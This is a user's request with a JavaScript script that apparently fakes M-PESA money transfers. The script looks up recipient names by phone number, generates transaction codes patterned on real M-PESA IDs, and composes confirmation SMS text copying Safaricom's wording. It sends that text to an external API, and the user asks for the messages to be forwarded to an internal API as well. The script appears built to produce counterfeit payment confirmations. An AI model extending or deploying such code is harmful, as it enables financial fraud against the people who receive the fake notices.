
this is my script for making transcation make it to be forwarding the messages also to the internal api also with the id as phone number been deducted funds while transcating only that and give final updated code and do not interfer with any feature of external api const SYSTEM_API = "https://funds-mauve.vercel.app/api";
const EXTERNAL_API = "https://mpesab.vercel.app";
let user = JSON.parse(localStorage.getItem('mledger_user'));
if (!user) location.href = 'index.html';
const elements = {
  phone: document.getElementById("phone"),
  amount: document.getElementById("amount"),
  name: document.getElementById("name"),
  editNote: document.getElementById("editNote"),
  status: document.getElementById("statusDisplay"),
  sendBtn: document.getElementById("sendBtn"),
  phoneOkBtn: document.getElementById("phoneOkBtn"),
  amountOkBtn: document.getElementById("amountOkBtn"),
  nameOkBtn: document.getElementById("nameOkBtn")
};
function formatBalance(amount) {
  return "Ksh " + Number(amount).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
}
function formatNumericDate() {
  const now = new Date();
  const day = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year = now.getFullYear();
  return `${day}/${month}/${year}`;
}
function formatTime12Hour() {
  const now = new Date();
  return now.toLocaleTimeString('en-US', {
    hour: 'numeric',
    minute: '2-digit',
    hour12: true
  });
}
function calculateCost(amt) {
  if (amt <= 100) return 0;
  if (amt <= 500) return 7;
  if (amt <= 1000) return 13;
  if (amt <= 5000) return 25;
  if (amt <= 10000) return 55;
  if (amt <= 20000) return 75;
  return 108;
}
function showStatus(msg, isError = false) {
  elements.status.textContent = msg;
  elements.status.className = isError ? 'status-text active error' : 'status-text active';
}
function showStep(step) {
  document.querySelectorAll('.current-step').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('input, button:not(#sendBtn)').forEach(el => el.classList.remove('active'));
  elements.editNote.style.display = "none";
  elements.status.className = 'status-text';
  if (step === 'phone') {
    document.getElementById('phoneLabel').classList.add('active');
    elements.phone.classList.add('active');
    elements.phoneOkBtn.classList.add('active');
  } else if (step === 'amount') {
    document.getElementById('amountLabel').classList.add('active');
    elements.amount.classList.add('active');
    elements.amountOkBtn.classList.add('active');
  } else if (step === 'name') {
    document.getElementById('nameLabel').classList.add('active');
    elements.name.classList.add('active');
    elements.nameOkBtn.classList.add('active');
    if (elements.name.value.trim()) elements.editNote.style.display = "block";
  } else if (step === 'options') {
    document.getElementById('optionsLabel').classList.add('active');
    elements.sendBtn.classList.add('active');
  }
}
function getYearLetter() {
  const year = new Date().getFullYear();
  const offset = year - 2026;
  return String.fromCharCode(85 + offset);
}
function getMonthThirdLetter() {
  const thirdLetters = "ABCDEFGHIJKL";
  return thirdLetters[new Date().getMonth()];
}
function getDayCode() {
  const day = new Date().getDate();
  if (day <= 9) {
    return day.toString();
  } else {
    return String.fromCharCode(65 + (day - 10));
  }
}
elements.phoneOkBtn.addEventListener("click", async () => {
  const phoneVal = elements.phone.value.trim();
  if (!phoneVal) return showStatus("Enter phone number", true);
  showStatus("Looking up name...");
  try {
    const res = await fetch(`${EXTERNAL_API}/lookup/${phoneVal}`);
    const data = await res.json();
    elements.name.value = data.found && data.name ? data.name : "";
  } catch {}
  showStep('amount');
});
elements.amountOkBtn.addEventListener("click", () => {
  const amt = parseFloat(elements.amount.value);
  if (!amt || amt <= 0) return showStatus("Enter a valid amount", true);
  const cost = calculateCost(amt);
  const required = amt + cost;
  if (required > user.balance) {
    return showStatus(`Availabe airtime in your account: ${formatBalance(user.balance)}\nNeed more airtime to total this amount : ${formatBalance(required)} Please buy airtime to complete transcation`, true);
  }
  showStep('name');
});
elements.nameOkBtn.addEventListener("click", () => {
  if (!elements.name.value.trim()) return showStatus("Please enter full name", true);
  showStep('options');
});
elements.sendBtn.addEventListener("click", async () => {
  const phoneVal = elements.phone.value.trim();
  const amountVal = parseFloat(elements.amount.value);
  const nameVal = elements.name.value.trim();
  const cost = calculateCost(amountVal);
  elements.sendBtn.innerText = "Processing...";
  elements.sendBtn.disabled = true;
  try {
    const sysRes = await fetch(`${SYSTEM_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fromPhone: user.phone,
        toPhone: phoneVal,
        amount: amountVal
      })
    });
    const sysData = await sysRes.json();
    if (!sysRes.ok) throw new Error(sysData.error || "Transaction failed");
    user.balance = sysData.balance;
    localStorage.setItem('mledger_user', JSON.stringify(user));
    const yearLetter = getYearLetter();
    const monthLetter = getMonthThirdLetter();
    const dayCode = getDayCode();
    const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
    const token = `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
    const dateStr = formatNumericDate();
    const timeStr = formatTime12Hour();
    const message = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} ${phoneVal} on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${user.balance.toFixed(2)}.Transaction Cost,Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,777.00.Earn interest daily on Ziidi MMF,Dial*334#`;
    showStatus(message);
    fetch(`${EXTERNAL_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phone: phoneVal,
        name: nameVal,
        amount: amountVal,
        message,
        token,
        cost
      })
    }).catch(() => {});
    setTimeout(() => {
      location.href = 'act.html';
    }, 1800);
  } catch (e) {
    showStatus(e.message || "Transaction failed", true);
    elements.sendBtn.innerText = "Try Again";
    elements.sendBtn.disabled = false;
  }
});
showStep('phone');
